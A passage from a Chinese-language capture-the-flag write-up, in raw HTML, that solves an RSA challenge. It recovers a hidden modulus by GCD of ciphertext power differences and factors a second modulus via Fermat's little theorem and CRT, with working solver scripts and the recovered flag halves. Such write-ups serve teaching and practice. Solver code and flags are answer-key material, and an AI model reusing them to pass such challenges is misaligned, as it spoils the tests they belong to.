<span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e.append(getPrime(bits))</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc1</span>(<span class="params">m, e, shift</span>):</span><br><span class="line">    n = next_prime(m &lt;&lt; shift)</span><br><span class="line">    tmp = getPrime(<span class="number">256</span>)</span><br><span class="line">    cc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        cc.append(<span class="built_in">int</span>(<span class="built_in">pow</span>(tmp, e[i], n)))</span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits)</span><br><span class="line">    q = getPrime(nbits)</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc2</span>(<span class="params">m, p, q, n</span>):</span><br><span class="line">    c = [<span class="built_in">pow</span>(m, p, n),<span class="built_in">pow</span>(m, q, n)]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">bits = <span class="number">6</span></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">e = e_gen(bits)</span><br><span class="line">shift = <span class="number">310</span></span><br><span class="line">c1 = enc1(m1,e,shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line">p, q = key_gen(nbits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c2 = enc2(m2, p, q, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="string">c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]</span></span><br><span class="line"><span class="string">n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"><span class="string">c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>flag1</code>，我觉得就是<strong>共模攻击</strong>，但是不知<code>n</code>要求<code>n</code>，然后去大佬糖醋小鸡块那里翻了一下(共模攻击)，还真有<br /><a href="https://tangcuxiaojikuai.xyz/post/9c1c22d0.html">https://tangcuxiaojikuai.xyz/post/9c1c22d0.html</a>的<strong>Middle_RSA2</strong>，还是需要多构造的</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>≡</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1\equiv m^{e1}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo>≡</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c2\equiv m^{e2}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mo>−</mo><mi>e</mi><mn>2</mn></mrow></msup><mo>∗</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>e</mi><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1^{-e2}*c2^{e1}\equiv 1mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mi>e</mi><mn>2</mn></mrow></msup><mo>≡</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1^{e2}\equiv c2^{e1}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mi>e</mi><mn>2</mn></mrow></msup><mo>−</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>e</mi><mn>1</mn></mrow></msup><mo>=</mo><mi>k</mi><mo>∗</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">c1^{e2}-c2^{e1}=k*n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>C</mi><mi>D</mi><mtext>求</mtext><mi>n</mi><mtext>即可</mtext></mrow><annotation encoding="application/x-tex">GCD求n即可</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord cjk_fallback">求</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = [<span class="number">43</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">59</span>]</span><br><span class="line">c1 = [<span class="number">304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117</span>, <span class="number">300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224</span>,</span><br><span class="line">      <span class="number">294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531</span>, <span class="number">255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835</span>, <span class="number">194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span>]</span><br><span class="line">k1_n = c1[<span class="number">0</span>]**e[<span class="number">1</span>]-c1[<span class="number">1</span>]**e[<span class="number">0</span>]</span><br><span class="line">k2_n = c1[<span class="number">1</span>]**e[<span class="number">2</span>]-c1[<span class="number">2</span>]**e[<span class="number">1</span>]</span><br><span class="line">n = GCD(k1_n, k2_n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(n &gt;&gt; <span class="number">310</span>).decode())</span><br><span class="line"><span class="comment"># flag&#123;3e99c26b-efdd-4c</span></span><br></pre></td></tr></table></figure><p><code>flag2</code>，费马小定理化简得到，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>≡</mo><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c2[0]\equiv m(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≡</mo><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c2[1]\equiv m(mod\ q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><br />参考<a href="https://blog.csdn.net/shshss64/article/details/130036481">博客</a></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>方法</mtext><mn>1</mn><mtext>：此处不化简</mtext></mrow><annotation encoding="application/x-tex">方法1：此处不化简</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord">1</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">简</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><msup><mo stretchy="false">]</mo><mi>n</mi></msup><mo>≡</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><msup><mo stretchy="false">]</mo><msup><mi>p</mi><mn>2</mn></msup></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c2[0]^{n}\equiv c2[1]^{p^{2}}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.23692em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><msup><mo stretchy="false">]</mo><mi>n</mi></msup><mo>≡</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c2[0]^{n}\equiv c2[1]mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><mi>p</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>n</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>−</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=GCD(pow(c2[0],n,n)-c2[1],n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>之后中国剩余定理求解</mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">之后中国剩余定理求解m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">国</span><span class="mord cjk_fallback">剩</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">解</span><span class="mord mathnormal">m</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line">c2 = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>,</span><br><span class="line">      <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(c2[<span class="number">0</span>], n, n)-c2[<span class="number">1</span>], n)</span><br><span class="line">q = n // p</span><br><span class="line">flag = crt([p, q], [c2[<span class="number">0</span>], c2[<span class="number">1</span>]])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag[<span class="number">0</span>]).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>方法</mtext><mn>2</mn><mtext>：此次化简得到</mtext></mrow><annotation encoding="application/x-tex">方法2：此次化简得到</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord">2</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">简</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">c2[0]=m+k_{1}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math 